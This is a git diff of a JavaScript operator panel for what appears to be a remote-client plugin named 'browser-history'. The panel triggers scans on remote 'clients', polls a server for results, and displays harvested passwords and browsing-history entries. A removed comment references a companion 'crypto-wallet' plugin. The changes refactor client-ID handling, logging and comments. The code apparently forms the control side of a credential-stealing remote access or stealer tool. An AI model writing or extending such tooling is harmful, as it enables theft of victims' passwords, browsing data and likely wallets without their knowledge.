@@ -13,26 +13,26 @@ const cardsArea         = document.getElementById("cards-area");
 const logEl             = document.getElementById("log");
 
 const pluginId = "browser-history";
-// Read clientId from URL — same approach as crypto-wallet
 const clientId = params.get("clientId") || "";
 clientIdInput.value = clientId;
 
 let pollTimer = null;
+
+// ─── Logging ──────────────────────────────────────────────────────────────────
 
 function log(line) {
   const ts = new Date().toISOString();
   logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
 }
 
+// ─── Status pill helpers ───────────────────────────────────────────────────────
+
 function setStatus(text, cls) {
   statusPill.textContent = text;
   statusPill.className = "status-pill " + cls;
 }
 
-// Prefer URL clientId, fall back to whatever was manually typed
-function getEffectiveClientId() {
-  return clientId || clientIdInput.value.trim();
-}
+// ─── Helpers ──────────────────────────────────────────────────────────────────
 
 function escapeHtml(s) {
   return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
@@ -53,35 +53,35 @@ function groupByFirstLetter(items, keyFn) {
   return groups;
 }
 
+// ─── API helpers ───────────────────────────────────────────────────────────────
+
 async function sendPluginEvent(event, payload) {
-  const id = getEffectiveClientId();
-  if (!id) { log("No client ID — open from a client context or paste one above"); return; }
-  try {
-    const res = await fetch(
-      `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/event`,
-      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ event, payload }) }
-    );
-    if (!res.ok) {
-      const text = await res.text();
-      log(`sendEvent failed: ${res.status} ${text}`);
-    } else {
-      const data = await res.json().catch(() => ({}));
-      if (data.queued) log("Event queued — waiting for plugin to load on client\u2026");
+  if (!clientId) { log("Missing clientId"); return; }
+  const res = await fetch(
+    `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ event, payload }),
     }
-  } catch (err) {
-    log(`sendEvent error: ${err.message}`);
+  );
+  if (!res.ok) {
+    const text = await res.text();
+    log(`sendEvent failed: ${res.status} ${text}`);
   }
 }
 
 async function pollEvents() {
-  const id = getEffectiveClientId();
-  if (!id) return;
+  if (!clientId) return;
   try {
     const res = await fetch(
-      `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/events`,
+      `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`,
       { method: "GET" }
     );
-    if (!res.ok) { log(`poll failed: ${res.status}`); return; }
+    if (!res.ok) {
+      log(`poll failed: ${res.status}`);
+      return;
+    }
     const data = await res.json();
     for (const item of data.events || []) {
       handleIncomingEvent(item.event, item.payload);
@@ -90,6 +90,8 @@ async function pollEvents() {
     log(`poll error: ${err.message}`);
   }
 }
+
+// ─── Render results ────────────────────────────────────────────────────────────
 
 function renderPasswords(passwords, total) {
   pwdCountBadge.textContent = String(total);
@@ -137,6 +139,8 @@ function renderResults(entries, total) {
   }).join("");
 }
 
+// ─── Handle incoming plugin events ────────────────────────────────────────────
+
 function handleIncomingEvent(event, payload) {
   if (event === "ready") {
     log("Plugin ready on client \u2014 auto-scan started");
@@ -161,6 +165,8 @@ function handleIncomingEvent(event, payload) {
   }
 }
 
+// ─── Polling control ──────────────────────────────────────────────────────────
+
 function startPolling() {
   stopPolling();
   pollTimer = setInterval(pollEvents, 2000);
@@ -171,24 +177,28 @@ function stopPolling() {
   if (pollTimer !== null) { clearInterval(pollTimer); pollTimer = null; }
 }
 
+// ─── Scan button ──────────────────────────────────────────────────────────────
+
 scanBtn.addEventListener("click", async () => {
-  const id = getEffectiveClientId();
-  if (!id) { log("Enter a Client ID first"); return; }
+  if (!clientId) {
+    log("No clientId in URL");
+    return;
+  }
   scanBtn.disabled = true;
   setStatus("Scanning\u2026", "status-scanning");
-  log(`Manual scan \u2014 client: ${id}`);
+  log("Manual scan triggered");
   await sendPluginEvent("scan", {});
   startPolling();
 });
 
-// ── Init ──────────────────────────────────────────────────────────────────────
-log(`JS loaded \u2014 url clientId: "${clientId}" \u2014 location: ${window.location.pathname}`);
+// ─── Init ─────────────────────────────────────────────────────────────────────
 
 if (!clientId) {
-  log("No clientId in URL \u2014 open from a client context menu, or paste one above and click Scan");
+  log("No clientId provided in URL \u2014 open this page from a client context");
   setStatus("No client selected", "status-idle");
 } else {
-  log(`Client: ${clientId} \u2014 waiting for auto-scan result\u2026`);
+  log(`Client: ${clientId}`);
+  log("Waiting for auto-scan result\u2026");
   setStatus("Awaiting auto-scan\u2026", "status-scanning");
   startPolling();
 }
